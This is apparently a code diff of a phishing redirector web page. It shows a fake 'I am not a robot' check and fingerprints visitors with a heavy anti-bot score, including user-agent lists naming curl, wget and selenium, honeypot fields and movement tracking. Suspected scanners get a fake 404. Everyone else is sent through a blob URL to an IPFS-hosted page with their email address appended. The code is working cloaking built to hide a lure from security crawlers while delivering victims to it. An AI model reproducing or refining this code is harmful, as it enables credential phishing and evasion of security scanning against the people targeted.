@@ -1,27 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Blob IPFS Redirect + Email Only + Anti-Bot</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Blob IPFS Redirect + Ultra Anti-Bot</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <style>
-html,body{margin:0;padding:0;width:100%;height:100%;font-family:Arial;overflow:hidden}
-#overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#f0f2f5;display:flex;align-items:center;justify-content:center;opacity:0;transition:0.3s;z-index:999999;}
-#verificationBox{background:#fff;padding:25px 30px;border-radius:8px;width:300px;box-shadow:0 5px 20px rgba(0,0,0,0.15);border:1px solid #ddd;text-align:left;}
-#checkbox{width:26px;height:26px;border:2px solid #7f8fa6;border-radius:4px;cursor:pointer;transition:0.3s;}
-#robotIcon{width:32px;height:32px;background:#e8f0fe;border-radius:50%;font-size:20px;display:flex;align-items:center;justify-content:center;animation:botRotate 2s linear infinite;}
-@keyframes botRotate{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
-#verifying{display:none;margin-top:15px;font-size:14px;color:#555;}
-.spinner{width:16px;height:16px;border-radius:50%;border:3px solid #40739e;border-top-color:transparent;animation:spin 0.6s linear infinite;}
-@keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
-.error-404{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#f8f8f8;text-align:center;}
-.error-404 h1{font-size:90px;margin:0;}
-.error-404 h2{font-size:26px;margin:0;}
-.error-404 p{font-size:18px;}
-.fullpage-iframe{position:fixed;top:0;left:0;width:100%;height:100%;border:none;margin:0;padding:0;}
+html, body { margin:0; padding:0; width:100%; height:100%; font-family:Arial; }
+
+/* Overlay for human check */
+#overlay {
+    position:fixed; top:0; left:0; width:100%; height:100%;
+    background:#f0f2f5; display:flex; align-items:center; justify-content:center;
+    opacity:0; transition:0.3s; z-index:999999;
+}
+
+#verificationBox {
+    background:#fff; padding:25px 30px; border-radius:8px;
+    width:300px; box-shadow:0 5px 20px rgba(0,0,0,0.15);
+    border:1px solid #ddd; text-align:left;
+}
+
+#checkbox {
+    width:26px; height:26px; border:2px solid #7f8fa6; border-radius:4px;
+    cursor:pointer; transition:0.3s;
+}
+
+/* 🔥 ROTATING BOT ICON */
+#robotIcon {
+    width:32px; height:32px; background:#e8f0fe; border-radius:50%;
+    font-size:20px; display:flex; align-items:center; justify-content:center;
+    animation:botRotate 2s linear infinite;
+}
+@keyframes botRotate { from {transform:rotate(0deg);} to {transform:rotate(360deg);} }
+
+#verifying { display:none; margin-top:15px; font-size:14px; color:#555; }
+
+.spinner {
+    width:16px; height:16px; border-radius:50%;
+    border:3px solid #40739e; border-top-color:transparent;
+    animation:spin 0.6s linear infinite;
+}
+@keyframes spin { from {transform:rotate(0deg);} to {transform:rotate(360deg);} }
+
+/* 404 */
+.error-404 {
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    height:100vh; background:#f8f8f8; text-align:center;
+}
+.error-404 h1 { font-size:90px; margin:0; }
+.error-404 h2 { font-size:26px; margin:0; }
+.error-404 p  { font-size:18px; }
 </style>
 </head>
 <body>
 
+<!-- HUMAN CHECK -->
 <div id="overlay">
     <div id="verificationBox">
         <div style="display:flex; align-items:center; gap:12px;">
@@ -29,6 +62,7 @@ html,body{margin:0;padding:0;width:100%;height:100%;font-family:Arial;overflow:h
             <strong style="flex:1;font-size:15px;">I am not a robot</strong>
             <div id="checkbox"></div>
         </div>
+
         <div id="verifying">
             <div style="display:flex; align-items:center; gap:5px;">
                 <div class="spinner"></div> Verifying…
@@ -38,95 +72,190 @@ html,body{margin:0;padding:0;width:100%;height:100%;font-family:Arial;overflow:h
 </div>
 
 <script>
-/* ------------------------- 404 PAGE ------------------------- */
-function show404(message){
-    document.body.innerHTML=`<div class="error-404"><h1>404</h1><h2>Error</h2><p>${message||'The requested page could not be found.'}</p></div>`;
+/* ------------------------------------------------------
+         ULTIMATE ENHANCED BOT DETECTION MODULE
+------------------------------------------------------ */
+async function strongBotCheck() {
+    let score = 0;
+
+    /* -------------------- BASIC HEADLESS CHECKS -------------------- */
+    const ua = navigator.userAgent.toLowerCase();
+    const botUA = ["bot","crawl","spider","curl","wget","python","scrapy","headless","selenium","puppeteer","playwright"];
+    if (botUA.some(x => ua.includes(x))) score += 40;
+    if (navigator.webdriver) score += 40;
+
+    /* -------------------- WEBGL TEST -------------------- */
+    try {
+        const canvas = document.createElement("canvas");
+        if (!canvas.getContext("webgl")) score += 20;
+    } catch { score += 20; }
+
+    /* -------------------- AUDIO CONTEXT TEST -------------------- */
+    try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        if (ctx.sampleRate < 30000) score += 10;
+    } catch { score += 10; }
+
+    /* -------------------- SCREEN-SIZE BEHAVIOR TEST -------------------- */
+    if (screen.width < 700 || screen.height < 500) score += 10;
+    if (window.outerWidth === 0) score += 20;
+
+    let screenChanges = 0;
+    window.addEventListener("resize", () => screenChanges++);
+    setTimeout(() => {
+        if (screenChanges > 5) score += 15;  // too many changes = bot script logic
+        if (screenChanges === 0 && screen.width > 1024) score += 10; // fake desktop window
+    }, 1200);
+
+    /* -------------------- TOUCH DEVICE AUTHENTICITY TEST -------------------- */
+    const claimedTouch = navigator.maxTouchPoints > 0;
+    let realTouchEvents = 0;
+
+    window.addEventListener("touchstart", () => realTouchEvents++);
+    window.addEventListener("touchmove", () => realTouchEvents++);
+
+    setTimeout(() => {
+        if (claimedTouch && realTouchEvents === 0) score += 25; // fake mobile browser
+    }, 800);
+
+    /* -------------------- HONEYPOT FIELD (AUTOFILL TRAP) -------------------- */
+    const honeypot = document.createElement("input");
+    honeypot.type = "text";
+    honeypot.style.position = "absolute";
+    honeypot.style.left = "-9999px";
+    honeypot.style.top = "-9999px";
+    honeypot.style.opacity = "0";
+    honeypot.style.pointerEvents = "none";
+    document.body.appendChild(honeypot);
+
+    setTimeout(() => {
+        if (honeypot.value.length > 0) score += 40;
+    }, 400);
+
+    /* -------------------- INVISIBLE GHOST BUTTON TRAP -------------------- */
+    const ghost = document.createElement("button");
+    ghost.style.position = "absolute";
+    ghost.style.left = "120px";
+    ghost.style.top = "120px";
+    ghost.style.opacity = "0";
+    ghost.style.pointerEvents = "none";
+    document.body.appendChild(ghost);
+
+    document.addEventListener("click", e => {
+        if (e.target === ghost) score += 40;
+    });
+
+    /* -------------------- INTERACTION ENTROPY -------------------- */
+    let movements = 0;
+    window.addEventListener("mousemove", () => movements++);
+    window.addEventListener("touchmove", () => movements++);
+
+    await new Promise(r => setTimeout(r, 700));
+
+    if (movements < 3) score += 40;
+
+    /* -------------------- LIGHT PROOF-OF-WORK -------------------- */
+    const challenge = Math.random().toString(36).substring(2);
+    try {
+        await crypto.subtle.digest("SHA-256", new TextEncoder().encode(challenge));
+    } catch {
+        score += 20;
+    }
+
+    /* -------------------- FINAL DECISION -------------------- */
+    return score >= 60;
 }
 
-/* ------------------------- DETECT SOCIAL MEDIA BROWSERS ------------------------- */
-function isSocialMediaBrowser(){
-    const ua=navigator.userAgent.toLowerCase();
-    const social=["instagram","fbav","fban","facebook","tiktok","musical.ly","snapchat","twitter","pinterest","linkedin","reddit","messenger","whatsapp","telegram","wechat"];
-    return social.some(x=>ua.includes(x));
+/* ------------------------------------------------------
+                 BLOB / IPFS CONFIG
+------------------------------------------------------ */
+const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
+
+function getEmail() {
+    return new URLSearchParams(location.search).get("email") || "";
 }
 
-/* ------------------------- DETECT MOBILE EMAIL REFERRERS ------------------------- */
-function isEmailReferrer(){
-    const params=new URLSearchParams(window.location.search);
-    if(params.get("source")==="email") return true;
-    const ref=document.referrer.toLowerCase();
-    const emailDomains=["mail.google.com","outlook.com","office.com","mail.yahoo.com","icloud.com","fastmail.com","proton.me"];
-    if(!ref || ref.trim()==="") return true; // allow if ref missing (common in mobile email apps)
-    return emailDomains.some(x=>ref.includes(x));
+function buildIPFS(email) {
+    return email ? BASE_IPFS + "#" + email : BASE_IPFS;
 }
 
-/* ------------------------- ENFORCE EMAIL ONLY ------------------------- */
-function enforceEmailOnly(){
-    if(!isEmailReferrer()) return false;
-    if(isSocialMediaBrowser()) return false;
-    return true;
+function createBlobHTML(url) {
+    return `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+                html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
+                iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
+            </style>
+        </head>
+        <body><iframe src="${url}"></iframe></body>
+        </html>
+    `;
 }
 
-/* ------------------------- ULTRA ANTI-BOT ------------------------- */
-async function strongBotCheck(){
-    let score=0;
-    const ua=navigator.userAgent.toLowerCase();
-    const botUA=["bot","crawl","spider","curl","wget","python","scrapy","headless","selenium","puppeteer","playwright"];
-    if(botUA.some(x=>ua.includes(x))) score+=40;
-    if(navigator.webdriver) score+=40;
-    try{ const c=document.createElement("canvas"); if(!c.getContext("webgl")) score+=20;}catch{score+=20;}
-    try{ const ctx=new (window.AudioContext||window.webkitAudioContext)(); if(ctx.sampleRate<30000) score+=10;}catch{score+=10;}
-    if(screen.width<700 || screen.height<500) score+=10;
-    let moves=0;
-    window.addEventListener("mousemove",()=>moves++);
-    window.addEventListener("touchmove",()=>moves++);
-    await new Promise(r=>setTimeout(r,700));
-    if(moves<3) score+=40;
-    return score>=60;
-}
+/* ------------------------------------------------------
+                  HUMAN VERIFICATION
+------------------------------------------------------ */
+function requireVerification() {
+    return new Promise(resolve => {
+        const overlay = document.getElementById("overlay");
+        const checkbox = document.getElementById("checkbox");
+        const verifying = document.getElementById("verifying");
 
-/* ------------------------- IPFS REDIRECT ------------------------- */
-const BASE_IPFS="https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
-function getEmail(){ return new URLSearchParams(location.search).get("email")||""; }
-function buildIPFS(email){ return email ? BASE_IPFS+"#"+email : BASE_IPFS; }
-function createBlobHTML(url){
-    return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><style>html,body,iframe{width:100%;height:100%;margin:0;padding:0;overflow:hidden}iframe{position:fixed;top:0;left:0;border:none}</style></head><body><iframe src="${url}" class="fullpage-iframe"></iframe></body></html>`;
-}
+        overlay.style.opacity = 1;
 
-/* ------------------------- HUMAN CHECK ------------------------- */
-function requireVerification(){
-    return new Promise(resolve=>{
-        const overlay=document.getElementById("overlay");
-        const checkbox=document.getElementById("checkbox");
-        const verifying=document.getElementById("verifying");
-        overlay.style.opacity=1;
-        checkbox.onclick=()=>{
-            checkbox.style.background="#40739e";
-            checkbox.style.borderColor="#40739e";
-            verifying.style.display="block";
-            setTimeout(()=>{overlay.style.opacity=0; setTimeout(()=>overlay.remove(),300); resolve(true);},900);
+        checkbox.onclick = () => {
+            checkbox.style.background = "#40739e";
+            checkbox.style.borderColor = "#40739e";
+            verifying.style.display = "block";
+
+            setTimeout(() => {
+                overlay.style.opacity = 0;
+                setTimeout(() => overlay.remove(), 300);
+                resolve(true);
+            }, 900);
         };
     });
 }
 
-/* ------------------------- MAIN FLOW ------------------------- */
-document.addEventListener("DOMContentLoaded",async()=>{
-    if(!enforceEmailOnly()){
-        show404("Blocked: Not opened from a valid email app.");
+/* ------------------------------------------------------
+                     SHOW 404
+------------------------------------------------------ */
+function show404() {
+    document.body.innerHTML = `
+        <div class="error-404">
+            <h1>404</h1>
+            <h2>Error</h2>
+            <p>The requested page could not be found.</p>
+        </div>`;
+}
+
+/* ------------------------------------------------------
+                      MAIN LOGIC
+------------------------------------------------------ */
+document.addEventListener("DOMContentLoaded", async () => {
+
+    // Strong anti-bot check
+    if (await strongBotCheck()) {
+        show404();
         return;
     }
-    if(await strongBotCheck()){
-        show404("Blocked: Bot detection triggered.");
-        return;
-    }
+
+    // Human checkbox step
     await requireVerification();
-    const email=getEmail();
-    const url=buildIPFS(email);
-    const blobHTML=createBlobHTML(url);
-    const blob=new Blob([blobHTML],{type:"text/html"});
-    const blobURL=URL.createObjectURL(blob);
-    window.location.href=blobURL;
+
+    // Blob redirect
+    const email = getEmail();
+    const url = buildIPFS(email);
+    const blobHTML = createBlobHTML(url);
+    const blob = new Blob([blobHTML], { type:"text/html" });
+    const blobURL = URL.createObjectURL(blob);
+
+    window.location.href = blobURL;
 });
 </script>
+
 </body>
 </html>
